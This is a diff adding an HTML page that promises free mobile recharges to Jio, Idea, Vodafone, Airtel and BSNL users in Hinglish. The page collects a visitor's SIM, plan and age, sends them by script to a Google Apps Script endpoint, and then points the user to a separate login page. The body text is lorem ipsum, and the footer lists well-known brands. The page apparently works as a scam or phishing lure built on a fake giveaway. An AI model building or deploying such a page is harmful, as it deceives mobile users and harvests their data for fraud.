@@ -1,0 +1,335 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Free Recharge For All Users</title>
+    <link rel="icon" href="logo.png">
+    <style>
+        body {
+            text-align: center;
+            background-color: lightgreen;
+        }
+        
+        .logo {
+            display: inline-block;
+            width: 100px;
+            height: 100px;
+        }
+        
+        .container {
+            /* border: 1px solid black; */
+        }
+        
+        .free-recharge {
+            border: 1px solid black;
+            padding: 10px;
+            background-color: crimson;
+            color: white;
+            border-radius: 10px;
+        }
+        
+        .top {
+            width: 90%;
+            border-radius: 10px;
+        }
+        
+        .aapko {
+            /* border: 1px solid black; */
+            padding: 5px;
+            background-color: crimson;
+            color: white;
+            border-radius: 10px;
+        }
+        
+        .center-img {
+            width: 90%;
+            border-radius: 10px;
+        }
+        
+        .sim-chuniye {
+            display: inline-block;
+            background-color: rgb(47, 47, 255);
+            padding: 10px;
+            color: yellow;
+            border-radius: 10px;
+        }
+        
+        .choose-sim {
+            padding: 10px;
+            background-color: rgb(255, 0, 0);
+            color: yellow;
+            border-radius: 10px;
+        }
+        
+        .animation {
+            display: flex;
+            width: 350px;
+            height: 350px;
+        }
+        
+        .animation img {
+            padding: 5px;
+        }
+        
+        .img1 {
+            width: 90%;
+            animation: img1;
+            margin-left: 10%;
+            animation-duration: 2s;
+            animation-iteration-count: infinite;
+            animation-timing-function: ease-in;
+            opacity: -1;
+        }
+        
+        @keyframes img1 {
+            0% {
+                opacity: -1;
+            }
+            100% {
+                opacity: 1;
+            }
+        }
+        
+        .plan-chuniye {
+            display: inline-block;
+            background-color: rgb(47, 47, 255);
+            padding: 10px;
+            color: yellow;
+            border-radius: 10px;
+        }
+        
+        .choose-plan {
+            margin: 10px;
+            padding: 10px;
+            background-color: rgb(255, 0, 0);
+            color: yellow;
+            border-radius: 10px;
+        }
+        
+        .age {
+            margin: 10px;
+            padding: 10px;
+            border: 2px solid black;
+            border-radius: 10px;
+        }
+        
+        .jio {
+            width: 95%;
+        }
+        
+        .change {
+            margin: 10px;
+            padding: 10px;
+            border: 2px solid blue;
+            background-color: rgb(255, 0, 0);
+            color: yellow;
+            border-radius: 10px;
+        }
+        
+        .next {
+            text-decoration: none;
+            padding: 10px;
+            margin: 10px;
+            border: 2px solid blue;
+            background-color: rgb(255, 0, 0);
+            color: yellow;
+            border-radius: 10px;
+        }
+        
+        .gif {
+            width: 90%;
+            background-color: ghostwhite;
+            border-radius: 20px;
+        }
+        
+        .bottom {
+            display: flex;
+            padding: 10px;
+        }
+        
+        .first {
+            padding-left: 10px;
+        }
+        
+        .second {
+            padding-left: 50px;
+        }
+    </style>
+</head>
+
+<body>
+    <img class="logo" src="logo.png" alt="">
+
+    <h5 class="free-recharge">Free <strong>Recharge </strong> For All Users</h5>
+
+    <img class="gif" src="gif1.gif" alt="">
+
+
+    <div class="container">
+
+        <p class="aapko">Aapko milta hai free <strong>Recharge</strong> Jio , Idia , Artel , Voda Phone or sabhi users ko </p>
+
+        <img class="center-img" src="center.jpeg" alt="">
+
+        <h3 class="sim-chuniye">Apni Sim Chuniye</h3>
+        <br>
+
+        <!-- =================================form======================================= -->
+
+        <form class="form" method="post" name="google-sheet">
+
+            <select class="choose-sim" name="mysim" id="sim">
+            <option value="sim">Choose Sim</option>
+            <option value="jio">Jio</option>
+            <option value="Idea">Idea</option>
+            <option value="vodafone">Vodafone</option>
+            <option value="artel">Artel</option>
+            <option value="bsnl">Bsnl</option>
+         </select>
+
+            <br>
+
+
+            <div class="animation">
+                <img class="img1" src="1.jpeg" alt="">
+            </div>
+
+            <h3 class="plan-chuniye">Apna Plan Chuniye</h3>
+            <br>
+
+
+
+            <select class="choose-plan" name="myplan" id="plan">
+            <option value="plan">Choose Plan</option>
+            <option value="plan">Jio Plans------</option>
+            <option value="jio-127">127..Rs</option>
+            <option value="jio-247">247..Rs</option>
+            <option value="jio-447">447..Rs</option>
+            <option value="jio-597">597..Rs</option>
+            <option value="plan">555..Rs</option>
+            
+            
+            <option value="plan">Idea Plans------</option>
+            <option value="idea-249">249..Rs</option>
+            <option value="idea-448">448..Rs</option>
+            <option value="idea-658">658..Rs</option>
+            <option value="idea-646">646..Rs</option>
+            <option value="idea-745">745..Rs</option>
+
+
+            <option value="plan">Vodafone------</option>
+            <option value="voda-199">199..Rs</option>
+            <option value="voda-209">209..Rs</option>
+            <option value="voda-249">249..Rs</option>
+            <option value="plan"></option>
+            <option value="plan"></option>
+
+
+            <option value="plan">Artel------</option>
+            <option value="artel-219">219..Rs</option>
+            <option value="artel-399">399..Rs</option>
+            <option value="aetel-449">449..Rs</option>
+            <option value="plan"></option>
+            <option value="plan"></option>
+
+
+            <option value="plan">Bsnl------</option>
+            <option value="bsnl-153">153..Rs</option>
+            <option value="bsnl-199">199..Rs</option>
+           
+        </select>
+            <br>
+
+            <img class="gif" src="gif2.gif" alt="">
+
+
+            <input class="age" type="text" name="myage" placeholder="Enter your age">
+            <br>
+
+            <img class="jio" src="jio.jpg" alt="">
+
+            <input class="change" type="submit" value="Submit  ">
+            <a id="next" class="next" href="login.html">Next</a>
+
+        </form>
+
+
+        <!-- =================================================form end============================================== -->
+
+        <p> Amet consectetur <strong>adipisicing</strong> elit. Fugiat cupiditate dolorem hic facere culpa eaque enim eum natus porro quam sint blanditiis excepturi numquam a similique officia sapiente corporis reiciendis, rem autem totam nulla laudantium.
+            Autem reiciendis nemo ad non! Minima harum impedit quis ullam ipsa exercitationem molestias debitis ipsum <strong>repellendus</strong> non et, doloribus ab, tempore possimus unde accusantium quia! Ea vel hic facere inventore dolor facilis?
+            Iste ad ducimus magni culpa pariatur, alias ratione. <strong>Obcaecati</strong> autem tempore, repudiandae doloribus fuga sit eius officia laudantium, earum maiores inventore, totam quibusdam. Mollitia eum iusto perferendis maxime optio excepturi
+            possimus placeat eveniet!</p>
+
+        <img class="top" src="top.jpeg" alt="">
+
+        <p> Dolor sit amet consectetur adipisicing elit. Est qui et minima dolores <strong>cupiditates</strong> quam assumenda tenetur! Sequi impedit debitis necessitatibus est hic eligendi nesciunt rerum ipsum quidem. Nihil sit minima quibusdam nobis ratione
+            <strong>consequuntur</strong> incidunt? Quis, quibusdam corrupti ea rerum, consectetur voluptatum placeat non quasi ex laudantium cum.</p>
+
+
+
+
+        <div class="bottom">
+            <div class="first">
+                <h3>General</h3>
+                <p>contact us </p>
+                <p>About us</p>
+                <p>FAQ's</p>
+                <p>Privacy Policy</p>
+                <p>Terms & Conditions</p>
+                <p>Blog</p>
+                <p>Parter With Us</p>
+            </div>
+
+            <div class="second">
+                <h3>Stores & Brands</h3>
+                <p>Swiggy</p>
+                <p>KFC</p>
+                <p>jio Mart</p>
+                <p>Zomato</p>
+                <p>Dunzo</p>
+                <p>All Store</p>
+            </div>
+        </div>
+
+        <div class="bottom">
+            <div class="first">
+                <h3>Categories</h3>
+                <p>food & drinks</p>
+                <p>hotels offers</p>
+                <p>travel offers</p>
+            </div>
+
+            <div class="second">
+                <h3>Festival Offers</h3>
+                <p>Deals</p>
+                <p>Diwali offers</p>
+                <p>holi offers</p>
+            </div>
+        </div>
+    </div>
+
+
+
+    <script>
+        const scriptURL = 'https://script.google.com/macros/s/AKfycbyzliLoy75L2OWyre-4z8LZNjXy_hXNDC1cB-xd97IOFvRGG9j1ENrLmafshj5Xgy5tHQ/exec'
+        const form = document.forms['google-sheet']
+
+        form.addEventListener('submit', e => {
+            e.preventDefault()
+            fetch(scriptURL, {
+                    method: 'POST',
+                    body: new FormData(form)
+                })
+                .then(response => alert("Plese click button ok and than press the next button  "))
+                .catch(error => console.error('Error!', error.message))
+        })
+    </script>
+
+
+</body>
+
+</html>
